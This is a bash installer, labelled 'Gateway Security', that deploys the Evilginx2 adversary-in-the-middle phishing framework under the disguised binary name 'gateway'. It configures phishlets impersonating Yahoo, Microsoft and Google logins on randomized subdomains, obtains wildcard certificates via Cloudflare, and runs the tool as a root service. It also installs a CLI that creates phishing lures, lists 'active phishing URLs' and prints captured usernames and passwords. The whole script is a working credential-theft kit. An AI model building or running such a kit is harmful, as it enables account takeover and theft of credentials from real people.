#!/bin/bash
# ============================================================================
# Gateway Security - One-Time Installer (Like fpages)
# ============================================================================
# Usage: 
#   First Command: sudo apt-get update && sudo apt-get install byobu unzip git && byobu-enable && exit
#   Second Command: git clone https://github.com/YOUR_USERNAME/gateway-security.git && cd gateway-security && chmod +x install.sh && sudo ./install.sh
# ============================================================================

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

print_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════╗
    ║                    Gateway Security Installer                    ║
    ║                         Version 1.0                              ║
    ╚══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }

print_banner

# Check if already installed
if [[ -f "/usr/local/bin/gateway" ]]; then
    warn "Gateway Security already installed!"
    echo ""
    echo "Run 'gateway' to manage your installation"
    echo "Run 'gateway update' to update"
    exit 0
fi

log "Starting installation..."

# Install dependencies
log "Installing system dependencies..."
apt-get update -y >/dev/null 2>&1
apt-get install -y git curl wget build-essential golang-go openssl jq \
    dnsutils python3 python3-pip expect nginx fail2ban byobu >/dev/null 2>&1

# Install Go if needed
if ! command -v go &>/dev/null; then
    wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
    tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
    rm go1.22.0.linux-amd64.tar.gz
    export PATH=$PATH:/usr/local/go/bin
fi

log "Dependencies installed"

# Get configuration from user
echo ""
log "Please enter your configuration:"
read -p "  Domain (e.g., motarmos.click): " DOMAIN
read -p "  VPS IP Address: " VPS_IP
read -p "  Cloudflare API Token: " CF_TOKEN
read -p "  Telegram Bot Token (optional): " TG_TOKEN
read -p "  Telegram Chat ID (optional): " TG_CHAT

# Create directories
mkdir -p /opt/gateway/{config,phishlets,certs,storage,logs,notifications}

# Copy phishlets
cp phishlets/*.yaml /opt/gateway/phishlets/

# Build Evilginx
log "Building gateway service..."
rm -rf /tmp/.build_cache
git clone https://github.com/kgretzky/evilginx2.git /tmp/.build_cache 2>/dev/null
cd /tmp/.build_cache
go mod tidy >/dev/null 2>&1
go build -buildvcs=false -o gateway 2>/dev/null
cp gateway /usr/local/bin/gateway
chmod +x /usr/local/bin/gateway

# Generate random subdomains
EP1="gw-$(openssl rand -hex 3)"
EP2="auth-$(openssl rand -hex 3)"
EP3="portal-$(openssl rand -hex 3)"

echo "$EP1" > /opt/gateway/.ep1
echo "$EP2" > /opt/gateway/.ep2
echo "$EP3" > /opt/gateway/.ep3

# Update phishlets with domain
sed -i "s/{{.Domain}}/$DOMAIN/g" /opt/gateway/phishlets/*.yaml
sed -i "s/{{.Endpoint1}}/$EP1/g" /opt/gateway/phishlets/yahoo.yaml
sed -i "s/{{.Endpoint2}}/$EP2/g" /opt/gateway/phishlets/microsoft.yaml
sed -i "s/{{.Endpoint3}}/$EP3/g" /opt/gateway/phishlets/google.yaml
sed -i "s/{{.VpsIp}}/$VPS_IP/g" /opt/gateway/phishlets/*.yaml
sed -i "s/{{.AppPort}}/443/g" /opt/gateway/phishlets/*.yaml

# Create config
cat > /opt/gateway/config/config.yaml << EOF
daemon: true
debug: false
domain: $DOMAIN
ipv4: $VPS_IP
http_port: 80
https_port: 443
dns_port: 0
autocert: false
phishlets_path: /opt/gateway/phishlets
cert_path: /opt/gateway/certs
database: /opt/gateway/storage/data.db
EOF

# Setup SSL with Cloudflare
log "Setting up SSL certificate..."
apt-get install -y certbot python3-certbot-dns-cloudflare >/dev/null 2>&1
cat > /etc/letsencrypt/cloudflare.ini << EOF
dns_cloudflare_api_token = $CF_TOKEN
EOF
chmod 600 /etc/letsencrypt/cloudflare.ini

certbot certonly --dns-cloudflare \
    --dns-cloudflare-credentials /etc/letsencrypt/cloudflare.ini \
    --dns-cloudflare-propagation-seconds 90 \
    --non-interactive --agree-tos --email "admin@$DOMAIN" \
    -d "$DOMAIN" -d "*.$DOMAIN" 2>/dev/null || warn "SSL failed - continuing with HTTP"

if [[ -d "/etc/letsencrypt/live/$DOMAIN" ]]; then
    cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "/opt/gateway/certs/$DOMAIN.crt"
    cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "/opt/gateway/certs/$DOMAIN.key"
fi

# Setup systemd service
cat > /etc/systemd/system/gateway.service << EOF
[Unit]
Description=Gateway Security Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/gateway
ExecStart=/usr/local/bin/gateway -c /opt/gateway/config -p /opt/gateway/phishlets
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable gateway
systemctl start gateway

# Configure gateway console
log "Configuring gateway..."
systemctl stop gateway
sleep 2

cat > /tmp/gw_cfg.exp << 'EOF'
#!/usr/bin/expect -f
set timeout 30
log_user 0
spawn /usr/local/bin/gateway -c /opt/gateway/config -p /opt/gateway/phishlets
expect "gateway>" { send "config domain $env(DOMAIN)\r" }
expect "gateway>" { send "config ipv4 external $env(VPS_IP)\r" }
expect "gateway>" { send "phishlets hostname yahoo $env(EP1).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable yahoo\r" }
expect "gateway>" { send "phishlets hostname microsoft $env(EP2).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable microsoft\r" }
expect "gateway>" { send "phishlets hostname google $env(EP3).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable google\r" }
expect "gateway>" { send "exit\r" }
expect eof
EOF

chmod +x /tmp/gw_cfg.exp
export DOMAIN VPS_IP EP1 EP2 EP3
/tmp/gw_cfg.exp 2>/dev/null
rm -f /tmp/gw_cfg.exp

systemctl start gateway

# Create CLI tool
log "Creating CLI tool..."
cat > /usr/local/bin/gateway-cli << 'CLIEOF'
#!/bin/bash
# Gateway Security CLI - Interactive Command Tool

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

show_help() {
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}Available Commands:${NC}"
    echo ""
    echo -e "${YELLOW}Configuration:${NC}"
    echo -e "  ${GREEN}set cloudflare_token <token>${NC}  - Set Cloudflare API token"
    echo -e "  ${GREEN}set telegram <token> <chat>${NC}   - Set Telegram credentials"
    echo -e "  ${GREEN}set domain <domain>${NC}           - Set main domain"
    echo -e "  ${GREEN}set vps_ip <ip>${NC}               - Set VPS IP address"
    echo ""
    echo -e "${YELLOW}Service:${NC}"
    echo -e "  ${GREEN}restart${NC}                       - Restart gateway service"
    echo -e "  ${GREEN}status${NC}                        - Show service status"
    echo -e "  ${GREEN}traffic${NC}                       - Show traffic statistics"
    echo -e "  ${GREEN}urls${NC}                          - Show active phishing URLs"
    echo -e "  ${GREEN}sessions${NC}                      - Show captured sessions"
    echo ""
    echo -e "${YELLOW}Phishlets:${NC}"
    echo -e "  ${GREEN}phishlets enable <name>${NC}       - Enable a phishlet"
    echo -e "  ${GREEN}phishlets disable <name>${NC}      - Disable a phishlet"
    echo -e "  ${GREEN}phishlets list${NC}                - List all phishlets"
    echo ""
    echo -e "${YELLOW}Lures:${NC}"
    echo -e "  ${GREEN}lures create <phishlet>${NC}       - Create new phishing URL"
    echo -e "  ${GREEN}lures list${NC}                    - List all lures"
    echo ""
    echo -e "${YELLOW}Other:${NC}"
    echo -e "  ${GREEN}help${NC}                          - Show this help"
    echo -e "  ${GREEN}exit${NC}                          - Exit CLI"
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
}

cmd_status() {
    if systemctl is-active --quiet gateway; then
        echo -e "${GREEN}[✓] Gateway is RUNNING${NC}"
    else
        echo -e "${RED}[✗] Gateway is STOPPED${NC}"
    fi
}

cmd_restart() {
    echo -e "${BLUE}[*] Restarting gateway...${NC}"
    sudo systemctl restart gateway
    echo -e "${GREEN}[✓] Restarted${NC}"
}

cmd_traffic() {
    echo -e "${BLUE}[*] Traffic Statistics:${NC}"
    if [[ -f "/opt/gateway/storage/data.db" ]]; then
        TOTAL=$(sudo sqlite3 /opt/gateway/storage/data.db "SELECT COUNT(*) FROM sessions;" 2>/dev/null || echo "0")
        echo -e "  ${GREEN}Total Visitors:${NC} $TOTAL"
    else
        echo "  No data yet"
    fi
}

cmd_urls() {
    if [[ -f "/opt/gateway/access_urls.txt" ]]; then
        cat /opt/gateway/access_urls.txt
    else
        echo -e "${YELLOW}[!] No URLs generated yet. Run 'lures create'${NC}"
    fi
}

cmd_sessions() {
    echo -e "${BLUE}[*] Captured Sessions:${NC}"
    if [[ -f "/opt/gateway/storage/data.db" ]]; then
        sudo sqlite3 /opt/gateway/storage/data.db -column -header "SELECT id, phishlet, username, password, ip, created_at FROM sessions ORDER BY id DESC LIMIT 10;"
    else
        echo "No sessions"
    fi
}

cmd_phishlets() {
    case "$2" in
        list) ls /opt/gateway/phishlets/*.yaml 2>/dev/null | xargs -n 1 basename | sed 's/.yaml//' ;;
        enable) 
            echo -e "${BLUE}[*] Enabling $3...${NC}"
            sudo systemctl stop gateway
            sudo /usr/local/bin/gateway -c /opt/gateway/config -p /opt/gateway/phishlets <<< "phishlets enable $3" 2>/dev/null
            sudo systemctl start gateway
            echo -e "${GREEN}[✓] Enabled${NC}"
            ;;
        disable)
            echo -e "${BLUE}[*] Disabling $3...${NC}"
            sudo systemctl stop gateway
            sudo /usr/local/bin/gateway -c /opt/gateway/config -p /opt/gateway/phishlets <<< "phishlets disable $3" 2>/dev/null
            sudo systemctl start gateway
            echo -e "${GREEN}[✓] Disabled${NC}"
            ;;
        *) echo "Usage: phishlets <list|enable|disable> [name]" ;;
    esac
}

cmd_lures() {
    case "$2" in
        create)
            echo -e "${BLUE}[*] Creating lure for $3...${NC}"
            sudo systemctl stop gateway
            output=$(sudo /usr/local/bin/gateway -c /opt/gateway/config -p /opt/gateway/phishlets <<< "lures create $3" 2>/dev/null)
            url=$(sudo /usr/local/bin/gateway -c /opt/gateway/config -p /opt/gateway/phishlets <<< "lures get-url 0" 2>/dev/null | grep -E "https?://")
            sudo systemctl start gateway
            echo -e "${GREEN}[✓] Lure created!${NC}"
            echo -e "${CYAN}URL: ${url}${NC}"
            echo "$url" >> /opt/gateway/access_urls.txt
            ;;
        list)
            sudo /usr/local/bin/gateway -c /opt/gateway/config -p /opt/gateway/phishlets <<< "lures" 2>/dev/null
            ;;
        *) echo "Usage: lures <create|list> [phishlet]" ;;
    esac
}

cmd_set() {
    case "$2" in
        domain) 
            sudo sed -i "s/^domain:.*/domain: $3/" /opt/gateway/config/config.yaml
            echo -e "${GREEN}[✓] Domain set to $3${NC}"
            cmd_restart
            ;;
        vps_ip)
            sudo sed -i "s/^ipv4:.*/ipv4: $3/" /opt/gateway/config/config.yaml
            echo -e "${GREEN}[✓] VPS IP set to $3${NC}"
            cmd_restart
            ;;
        *) echo "Usage: set <domain|vps_ip> <value>" ;;
    esac
}

# Main CLI loop
echo -e "${CYAN}Gateway Security CLI - Type 'help' for commands${NC}"
echo ""

while true; do
    echo -n -e "${GREEN}gateway> ${NC}"
    read -r input
    case "$input" in
        "" ) continue ;;
        help) show_help ;;
        status) cmd_status ;;
        restart) cmd_restart ;;
        traffic) cmd_traffic ;;
        urls) cmd_urls ;;
        sessions) cmd_sessions ;;
        phishlets\ *) cmd_phishlets $input ;;
        lures\ *) cmd_lures $input ;;
        set\ *) cmd_set $input ;;
        exit) echo -e "${GREEN}Goodbye!${NC}"; exit 0 ;;
        *) echo -e "${RED}Unknown command. Type 'help'${NC}" ;;
    esac
    echo ""
done
CLIEOF

chmod +x /usr/local/bin/gateway-cli

# Create update script
cat > /usr/local/bin/gateway-update << 'UPDATEEOF'
#!/bin/bash
echo "[*] Updating Gateway Security..."
cd /opt/gateway
systemctl stop gateway
rm -rf /tmp/.build_cache
git clone https://github.com/kgretzky/evilginx2.git /tmp/.build_cache
cd /tmp/.build_cache
go build -buildvcs=false -o gateway
cp gateway /usr/local/bin/gateway
systemctl start gateway
echo "[✓] Update complete! Run 'gateway-cli' to manage"
UPDATEEOF

chmod +x /usr/local/bin/gateway-update

log "Installation complete!"
echo ""
echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}                    INSTALLATION COMPLETE!                       ${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Run 'gateway-cli' to manage your gateway"
echo ""
echo "Quick start:"
echo "  gateway-cli"
echo "  gateway> status"
echo "  gateway> phishlets list"
echo "  gateway> lures create google"
echo "  gateway> urls"
echo ""